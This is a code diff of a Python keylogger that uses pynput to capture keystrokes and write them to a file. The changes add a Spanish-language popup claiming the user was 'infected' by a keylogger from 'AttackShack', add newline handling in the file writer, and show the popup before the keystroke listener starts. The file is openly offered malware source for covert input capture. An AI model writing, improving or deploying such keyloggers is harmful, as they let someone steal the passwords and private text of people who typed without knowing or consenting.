@@ -1,8 +1,14 @@
 import pynput
+from tkinter import messagebox
 from pynput.keyboard import Key, Listener
 
 count = 0
 keys = []
+
+
+def pantallazo():
+    messagebox.showerror(
+        "Sistema", "Usted ha sido infectado por un Keylogger desarrollado por AttackShack")
 
 
 def writefile(keys):
@@ -18,6 +24,9 @@ def writefile(keys):
             elif k.find("tab    ") > 0:
                 f.write('\t')
             elif k.find("Key") == -1:
+                f.write(k)
+            else:
+                f.write("\n")
                 f.write(k)
 
 
@@ -35,5 +44,6 @@ def onRelease(key):
         return False
 
 
+pantallazo()
 with Listener(on_press=onPress, on_release=onRelease) as listener:
     listener.join()
